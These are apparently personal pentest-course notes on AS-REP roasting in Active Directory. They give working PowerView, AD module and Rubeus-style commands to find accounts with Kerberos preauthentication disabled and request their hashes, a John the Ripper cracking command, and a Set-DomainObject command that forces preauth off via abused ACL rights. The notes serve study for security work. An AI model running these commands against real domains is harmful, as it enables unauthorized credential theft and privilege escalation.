# Asreproasting
So, the scenario is if we compromise student 1 then identify student1 has local admin rights on another machine we escalate privilege and move to that machine and dump hashes and comrpomise another account which is local admin on another machine then we move to that machine from initial machine and dump hash and again comromise new user and find he/she is local admin on another machine where Domain Admin has session so we move to that machine and dump DA creds but imagine after compromising a user we do not find that he/she has local admin rights on any machine or it can be that from initial machine student1 may not have local admin rights on any other machine or it can be that we donot find other paths where compromised user has session in such case try kerberoasting and if it does not work try asreproasting attack.

## ASREProasting working
If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline. It means during the first step of kerberose where a valid user asks for TGT with authentication server he/she needs to send an encrypted timestamp along with the request. The timestamp is encrypted with the user's password and If the DC can decrypt that timestamp using its own record of the user’s password hash, it will send back an Authentication Server Response (AS-REP) message that contains a Ticket Granting Ticket (TGT). However, if preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an AS-REP message. Since part of that message is encrypted using the user’s password, the attacker can then attempt to brute-force the user’s password offline. We should use asreproasting if we have generic all or generic write permission over a user.

# Enumerating accounts with Kerberos Preauthdisabled 

- Using PowerView
```
Get-DomainUser -PreauthNotRequired -Verbose
```
- Using ActiveDirectorymodule:
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
- ASreproast
```
Get-ASREPHash -UserName VPN1user -Verbose
```
- To enumerate all users with Kerberos preauthdisabled and request a hash
```
Invoke-ASREPRoast -Verbose
```
- We can use John The Ripper to brute-force the hashes offline
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

## We can also Force disable Kerberos Preauth:

- Let's enumerate the permissions for RDPUserson ACLs using PowerView
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
- We found we have generic write or generic all permission that means we can disable pre auth on a user's account and asreproast
```
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```
